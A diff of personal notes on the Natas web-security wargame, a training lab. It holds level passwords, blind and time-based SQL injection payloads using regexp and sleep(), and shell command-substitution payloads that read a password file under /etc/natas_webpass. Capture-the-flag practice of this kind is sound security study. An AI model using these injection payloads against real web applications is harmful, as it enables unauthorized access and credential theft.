@@ -106,6 +106,8 @@ BROOOOO YOU CAN HAVE COMMENTS!!!!!
 
 * 15: AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
 
+File: ./sockets.py
+
 natas16" and cast(password as binary) regexp '^..w' # 
 
 loop through this. Maybe use python or something
@@ -115,6 +117,8 @@ blind based sql injection
 couldve used the injection natas16" and password LIKE BINARY"
 
 * 16: WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
+
+File: ./natas16.py
 
 $(grep -o ^. /etc/natas_webpass/natas17)
 $(cut -c 2 /etc/natas_webpass/natas17)
@@ -127,4 +131,22 @@ cat 16pass.txt | grep -oP '^.\K(a)'
 
 ^$(grep -oP ^.\K(P) /etc/natas_webpass/natas17)
 
+couldve done
+doomed$(grep ^...{char} /etc/natas_webpass/natas17) 
+If no output, char is there
+If there is an output, there is no char
+
 * 17: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
+
+natas18"- IF(1, NULL, sleep(15))#
+print(session.get(url).elapsed.total_seconds())
+
+Hacking stages: 
+1.) Research
+2.) Manual testing
+3.) Automation
+
+natas18"-IF(cast(password as binary) regexp '^{periods}{letter}', sleep(8), null) #
+
+
+natas16" - IF(cast(password as binary) regexp '^WaIHEa', 0, 1 ) #
